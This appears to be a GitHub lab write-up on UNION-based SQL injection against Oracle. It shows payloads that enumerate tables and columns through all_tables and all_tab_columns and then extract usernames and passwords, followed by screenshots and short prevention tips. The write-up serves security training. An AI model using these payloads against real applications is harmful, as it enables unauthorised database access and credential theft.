## 🧪 SQL Injection – Listing Database Contents (Oracle)

## 📌 Lab: Extract Tables & Columns

### 🎯 Objective

List database tables and columns

---

### 🔍 Vulnerability Type

SQL Injection (UNION-based)

---

### ⚙️ Steps Performed

1. Found table names:

```sql
' UNION SELECT table_name, NULL FROM all_tables --
```

2. Found columns:

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS' --
```

---

### 💉 Payload Used

```sql
' UNION SELECT username, password FROM users --
```

---

### 🧠 Explanation

* `all_tables` → list tables
* `all_tab_columns` → list columns

---

### 📸 Proof of Concept

<img width="1920" height="1080" alt="LAB - 5 - 0" src="https://github.com/user-attachments/assets/6973cb2c-ae3c-40e7-a8c7-edf7d67822b4" />
<img width="1920" height="1080" alt="LAB - 5 - 1" src="https://github.com/user-attachments/assets/63544453-c2f4-4f37-abd8-bf6ccd8a1dc3" />
<img width="1920" height="1080" alt="LAB - 5 - 2" src="https://github.com/user-attachments/assets/ab269424-35a5-4d12-a7eb-8d6dbe8da43c" />
<img width="1917" height="1080" alt="LAB - 5 - 3" src="https://github.com/user-attachments/assets/a6951f1b-cfcc-400d-9b24-e897892e9d6d" />
<img width="1920" height="1080" alt="LAB - 5 - 4" src="https://github.com/user-attachments/assets/908a6884-85ba-4572-a388-7b383e65e7cd" />
<img width="1920" height="1080" alt="LAB - 5 - 5" src="https://github.com/user-attachments/assets/2cbed915-732e-494d-9cc3-a5047e35307f" />
<img width="1920" height="1080" alt="LAB - 5 - 6" src="https://github.com/user-attachments/assets/bfbb4e7d-54bf-48e3-b174-77732e57d00f" />
<img width="1920" height="1080" alt="LAB - 5 - 7" src="https://github.com/user-attachments/assets/28ace52d-d4b9-460e-8fd2-411401d7b714" />
<img width="1920" height="1080" alt="LAB - 5 - 8" src="https://github.com/user-attachments/assets/149218ff-6df3-4984-8734-1fdafe8272e5" />

---

### ✅ Result

Extracted usernames and passwords.

---

### 🛡️ Prevention

* Limit DB permissions
* Avoid exposing metadata
* Use secure queries

---

### 📚 Learning Outcome

* Learned database enumeration
* Understood Oracle metadata tables
